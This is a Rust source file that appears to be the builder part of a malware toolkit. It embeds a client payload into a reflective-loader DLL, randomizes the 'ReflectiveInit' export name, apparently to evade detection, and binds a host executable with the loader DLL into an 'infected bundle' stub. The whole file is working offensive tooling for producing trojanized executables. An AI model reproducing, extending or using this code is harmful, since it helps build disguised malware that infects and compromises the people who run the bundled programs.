use std::fs;
use std::path::Path;
use rand::{distr::Alphanumeric, rng, Rng};
use object::read::pe::PeFile64;
use object::{Object, ObjectSection};

pub fn embed_client_in_dll(dll_path: &Path, client_path: &Path, volatile: bool) -> Result<(), String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;
    let client_bytes = fs::read(client_path).map_err(|e| e.to_string())?;

    patch_section_by_name(&mut dll_bytes, ".payload", &client_bytes)?;

    // Patch config for volatile mode
    let config_str = if volatile { "VOLATILE=TRUE\0" } else { "VOLATILE=FALSE\0" };
    patch_section_by_name(&mut dll_bytes, ".config", config_str.as_bytes())?;

    fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

pub fn randomize_dll_exports(dll_path: &Path) -> Result<String, String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;

    let random_name: String = rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect();

    match patch_export_table(&mut dll_bytes, "ReflectiveInit", &random_name) {
        Ok(_) => {
             fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
             Ok(random_name)
        },
        Err(e) => {
            println!("Export table patching failed, using fallback: {}", e);
            // Fallback to primitive search and replace
            let target = b"ReflectiveInit\0";
            if let Some(pos) = dll_bytes.windows(target.len()).position(|window| window == target) {
                let name_bytes = random_name.as_bytes();
                for i in 0..name_bytes.len() {
                    dll_bytes[pos + i] = name_bytes[i];
                }
                dll_bytes[pos + name_bytes.len()] = 0;
                fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
                Ok(random_name)
            } else {
                Ok("Default".to_string())
            }
        }
    }
}

fn patch_export_table(bytes: &mut [u8], _old_name: &str, _new_name: &str) -> Result<(), String> {
    let _file = PeFile64::parse(&*bytes).map_err(|e| e.to_string())?;
    Err("PE export table patching is not implemented for this object crate version".to_string())
}

pub fn create_infected_bundle(
    binder_stub_path: &Path,
    host_exe_path: &Path,
    loader_dll_path: &Path,
    dll_name: &str,
    output_path: &Path
) -> Result<(), String> {
    let mut binder_bytes = fs::read(binder_stub_path).map_err(|e| e.to_string())?;
    let host_bytes = fs::read(host_exe_path).map_err(|e| e.to_string())?;
    let dll_bytes = fs::read(loader_dll_path).map_err(|e| e.to_string())?;

    patch_section_by_name(&mut binder_bytes, ".host", &host_bytes)?;
    patch_section_by_name(&mut binder_bytes, ".dll", &dll_bytes)?;

    // Patch config (DLL name)
    let mut config_data = [0u8; 1024];
    let dll_name_bytes = dll_name.as_bytes();
    let len = std::cmp::min(dll_name_bytes.len(), 1023);
    config_data[..len].copy_from_slice(&dll_name_bytes[..len]);

    patch_section_by_name(&mut binder_bytes, ".config", &config_data)?;

    fs::write(output_path, binder_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

fn patch_section_by_name(bytes: &mut [u8], section_name: &str, data: &[u8]) -> Result<(), String> {
    let file = PeFile64::parse(&*bytes).map_err(|e| format!("Failed to parse PE: {}", e))?;

    let section = file.sections()
        .find(|s| s.name().unwrap_or("") == section_name)
        .ok_or_else(|| format!("Section {} not found", section_name))?;

    let (offset, size) = section.file_range()
        .ok_or_else(|| format!("Section {} has no file range", section_name))?;

    if data.len() > size as usize {
        return Err(format!("Data too large for section {} ({} > {})", section_name, data.len(), size));
    }

    let start = offset as usize;
    for (i, &byte) in data.iter().enumerate() {
        bytes[start + i] = byte;
    }

    // Optionally zero out the rest of the section
    for i in data.len()..(size as usize) {
        bytes[start + i] = 0;
    }

    Ok(())
}
